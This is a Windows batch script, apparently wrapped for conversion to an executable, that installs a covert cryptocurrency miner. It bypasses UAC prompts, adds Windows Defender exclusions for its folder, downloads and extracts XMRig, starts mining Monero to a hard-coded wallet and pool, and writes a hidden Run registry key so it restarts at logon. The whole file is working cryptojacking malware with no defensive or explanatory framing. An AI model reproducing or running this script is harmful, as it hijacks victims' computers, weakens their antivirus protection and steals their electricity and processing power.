::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFC5HSRa+GGStCLkT6ezo082CrUAYQPAmNYvaybzAKeMcig==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdFu5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSTk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQImeFUFAlTi
::ZQ05rAF9IBncCkqN+0xwdVsEAlXMbAs=
::ZQ05rAF9IAHYFVzEqQIXLRRZSRCQJSueB6YUiA==
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWH6h2yI=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEphJifns=
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFC5HSRa+GGStCLkT6ezo082CrUAYQPAmOKvaybzAJfgWig==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal

:: === Settings ===
set "DOWNLOAD_URL=https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
set "ZIP_NAME=xmrig.zip"
set "FOLDER_NAME=xmrig"
set "TARGET_NAME=xmrig"

REM UAC
cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %1"

:: === Add Defender exclusion ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$targetName = '%TARGET_NAME%'; ^
$folders = Get-ChildItem -Path 'C:\' -Recurse -Directory -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -eq $targetName }; ^
foreach ($folder in $folders) { Add-MpPreference -ExclusionPath $folder.FullName }"

:: === Download ===
echo Downloading...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_NAME%'"

:: === Add Defender exclusion ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$targetName = '%TARGET_NAME%'; ^
$folders = Get-ChildItem -Path 'C:\' -Recurse -Directory -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -eq $targetName }; ^
foreach ($folder in $folders) { Add-MpPreference -ExclusionPath $folder.FullName }"

:: === Extract ===
echo Extracting...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Expand-Archive -Path '%ZIP_NAME%' -DestinationPath '%FOLDER_NAME%' -Force"

:: === Enter folder ===
echo Enter
cd /d "%~dp0\xmrig"

for /d %%i in (*) do (
    cd "%%i"
    goto found
)

:found
dir xmrig.exe

echo Starting...

xmrig.exe -o pool.supportxmr.com:443 -u 441qAPmYrqYjmAnip6JVf6MmgxR3xSKGSBHKfTHDvdD5bvMX4oj4FgkAKmqsqnjPN21ncqiMXF5ZWdrUaS8TNAVG2BGYAKs -p x -k --tls 

powershell -Command "Start-Process 'powershell' -ArgumentList 'REG ADD ''HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'' /v ''xmrig'' /t REG_SZ /d ''%~dp0%v.0.1.0.bat'' /f' -WindowStyle Hidden"

